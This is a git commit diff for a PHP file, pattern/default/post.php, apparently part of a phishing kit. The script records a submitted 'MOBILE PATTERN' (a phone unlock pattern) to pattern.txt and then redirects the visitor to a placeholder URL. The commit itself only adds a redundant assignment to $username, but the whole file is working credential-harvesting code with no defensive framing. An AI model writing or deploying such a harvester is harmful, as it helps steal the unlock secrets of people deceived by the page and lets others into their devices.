275c2aee3bd64f88cb0144e01013c4f45c75c7a2
Neeraj SK <mralygnt@gmail.com>
2023-10-26 00:09:11 +0530

    Update post.php

--- pattern/default/post.php
+++ pattern/default/post.php
@@ -1,5 +1,5 @@
 <?php
-file_put_contents("pattern.txt", "MOBILE PATTERN : " . $_POST['pattern'] . "\n", FILE_APPEND);
+file_put_contents("pattern.txt", "MOBILE PATTERN : "  . $username = $_POST['pattern'] . "\n", FILE_APPEND);
 header('Location: redirecturl');
 exit();
 ?>
